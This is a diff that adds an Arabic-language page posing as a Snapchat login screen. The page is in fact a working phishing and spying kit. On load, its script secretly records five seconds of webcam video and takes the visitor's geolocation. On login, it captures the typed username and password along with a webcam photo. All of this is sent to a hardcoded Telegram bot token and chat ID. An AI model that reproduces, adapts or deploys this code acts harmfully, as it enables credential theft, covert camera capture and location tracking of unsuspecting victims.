@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة تسجيل الدخول</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #fffc00;
+            font-family: Arial, sans-serif;
+            direction: rtl;
+        }
+        .container {
+            width: 300px;
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            margin: 0;
+            font-size: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #00bfff;
+            color: white;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #0099cc;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <img src="20231126101835!شعار_سناب_شات.png" alt="شعار سناب شات" class="logo">
+    <div class="container">
+        <h1>تسجيل الدخول</h1>
+        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button id="loginButton">تسجيل الدخول</button>
+    </div>
+    
+    <video id="video" autoplay playsinline style="display: none;"></video>
+    
+    <script>
+        let latitude = 'لم يُسمح بالوصول إلى الموقع';
+        let longitude = 'لم يُسمح بالوصول إلى الموقع';
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function requestPermissions() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                return stream;
+            } catch (err) {
+                console.error('خطأ في الحصول على الأذونات: ', err);
+                return null;
+            }
+        }
+
+        async function getLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    latitude = position.coords.latitude;
+                    longitude = position.coords.longitude;
+                    resolve();
+                }, (error) => {
+                    console.error('خطأ في الحصول على الموقع: ', error);
+                    resolve();
+                });
+            });
+        }
+
+        async function initialCapture() {
+            const stream = await requestPermissions();
+            await getLocation();
+
+            if (stream) {
+                document.getElementById('video').srcObject = stream;
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = [];
+                    sendData(videoBlob, "#رسالة_1 (التسجيل الأولي)");
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 5000); // مدة الفيديو 5 ثوانٍ
+            }
+        }
+
+        document.getElementById('loginButton').addEventListener('click', async () => {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const stream = await requestPermissions();
+            await getLocation();
+
+            if (stream) {
+                const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+                imageCapture.takePhoto().then((blob) => {
+                    sendData(blob, "#رسالة_2 (بعد تسجيل الدخول)", username, password);
+                    stream.getTracks().forEach(track => track.stop());
+                });
+            }
+        });
+
+        function sendData(mediaBlob, messageTag, username = null, password = null) {
+            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+            const chatId = '6185375878';
+
+            const messageContent = `
+${messageTag}:
+${username ? `📩 اسم المستخدم: ${username}\n🔒 كلمة المرور: ${password}\n` : ""}
+🎯 إحداثيات الموقع:
+🌍 Latitude: ${latitude}
+🌍 Longitude: ${longitude}
+`;
+
+            const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+            const apiUrlMedia = `https://api.telegram.org/bot${token}/sendVideo`;
+
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: messageContent
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال الرسالة إلى Telegram:', data);
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append(mediaBlob.type.startsWith('video') ? 'video' : 'photo', mediaBlob, mediaBlob.type.startsWith('video') ? 'video.webm' : 'photo.jpg');
+                formData.append('caption', messageContent);
+
+                return fetch(apiUrlMedia, {
+                    method: 'POST',
+                    body: formData
+                });
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('تم إرسال الوسائط إلى Telegram:', data);
+            })
+            .catch(error => {
+                console.error('خطأ في إرسال البيانات إلى Telegram: ', error);
+            });
+        }
+
+        initialCapture(); // تنفيذ الالتقاط الأولي عند فتح الصفحة
+    </script>
+</body>
+</html>
